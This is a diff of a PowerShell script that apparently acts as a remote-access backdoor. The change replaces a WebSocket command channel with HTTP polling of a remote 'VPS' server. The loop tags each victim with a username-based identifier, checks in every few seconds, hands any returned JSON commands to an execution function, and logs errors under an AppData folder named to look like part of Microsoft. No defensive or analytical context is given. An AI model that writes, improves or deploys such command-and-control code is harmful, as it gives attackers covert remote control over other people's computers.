@@ -27,7 +27,7 @@ else {
 }
 
 $uniqueUser = "$($env:USERNAME)-$uniqueId-W"
-$SCRIPT_VERSION = "564ed0b"
+$SCRIPT_VERSION = "9d5cb11"
 $clientVersion = $SCRIPT_VERSION
 
 function Execute-CommandPayload ($r) {
@@ -74,82 +74,24 @@ try {
     try {
       $safeUser = [System.Uri]::EscapeDataString([string]$uniqueUser)
       $safeVer = [System.Uri]::EscapeDataString([string]$clientVersion)
-      $wsUri = "$VPS_WS_URL?username=$safeUser&version=$safeVer"
-      $ws = New-Object System.Net.WebSockets.ClientWebSocket
-      $cts = New-Object System.Threading.CancellationTokenSource
-      $cts.CancelAfter(10000)
-
-      $ws.ConnectAsync([System.Uri]::new($wsUri), $cts.Token).Wait()
-
-      if ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
-        $buffer = [System.ArraySegment[byte]]::new((New-Object byte[] 8192))
-        $lastPing = [DateTime]::UtcNow
-
-        while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
-          if (([DateTime]::UtcNow - $lastPing).TotalSeconds -ge 15) {
-            $pingObj = @{ type = "ping"; version = $clientVersion } | ConvertTo-Json -Compress
-            $pingBytes = [System.Text.Encoding]::UTF8.GetBytes($pingObj)
-            $pingSeg = [System.ArraySegment[byte]]::new($pingBytes)
-            $ws.SendAsync($pingSeg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
-            $lastPing = [DateTime]::UtcNow
-          }
-
-          $receiveTask = $ws.ReceiveAsync($buffer, [System.Threading.CancellationToken]::None)
-          if (-not $receiveTask.Wait(2000)) {
-            continue
-          }
-
-          $result = $receiveTask.Result
-          if ($result.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
-            $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "", [System.Threading.CancellationToken]::None).Wait()
-            break
-          }
-
-          $ms = New-Object System.IO.MemoryStream
-          if ($result.Count -gt 0) {
-            $ms.Write($buffer.Array, $buffer.Offset, $result.Count)
-          }
-
-          while (-not $result.EndOfMessage -and $ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
-            $receiveTask = $ws.ReceiveAsync($buffer, [System.Threading.CancellationToken]::None)
-            $receiveTask.Wait()
-            $result = $receiveTask.Result
-            if ($result.Count -gt 0) {
-              $ms.Write($buffer.Array, $buffer.Offset, $result.Count)
-            }
-          }
-
-          if ($ms.Length -gt 0) {
-            $jsonStr = [System.Text.Encoding]::UTF8.GetString($ms.ToArray())
-            $r = $jsonStr | ConvertFrom-Json
-            Execute-CommandPayload $r
-          }
+      $pollUrl = "$VPS_POLL_URL?username=$safeUser&version=$safeVer"
+      
+      $r = Invoke-RestMethod -Method Get -Uri $pollUrl -TimeoutSec 10 -UseBasicParsing
+      if ($r) {
+        if ($r -is [string]) {
+          $r = $r | ConvertFrom-Json
         }
-
+        Execute-CommandPayload $r
       }
     }
     catch {
       $logFile = "$env:APPDATA\Microsoft\run\run_error.log"
-      $errText = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [WS Error]: $($_.Exception.ToString())"
+      $errText = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [Poll Error]: $($_.Exception.Message)"
       Add-Content -Path $logFile -Value $errText -ErrorAction SilentlyContinue
-
-      try {
-        $safeUser = [System.Uri]::EscapeDataString([string]$uniqueUser)
-        $safeVer = [System.Uri]::EscapeDataString([string]$clientVersion)
-        $u = "$VPS_POLL_URL?username=$safeUser&version=$safeVer"
-        $r = Invoke-RestMethod -Method Get -Uri $u -TimeoutSec 5
-        Execute-CommandPayload $r
-      }
-      catch {
-        $pollErrText = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [Poll Error]: $($_.Exception.ToString())"
-        Add-Content -Path $logFile -Value $pollErrText -ErrorAction SilentlyContinue
-      }
-      Start-Sleep -Seconds 3
     }
 
+    Start-Sleep -Seconds 3
   }
-
-
 }
 finally {
   if ($m1) {
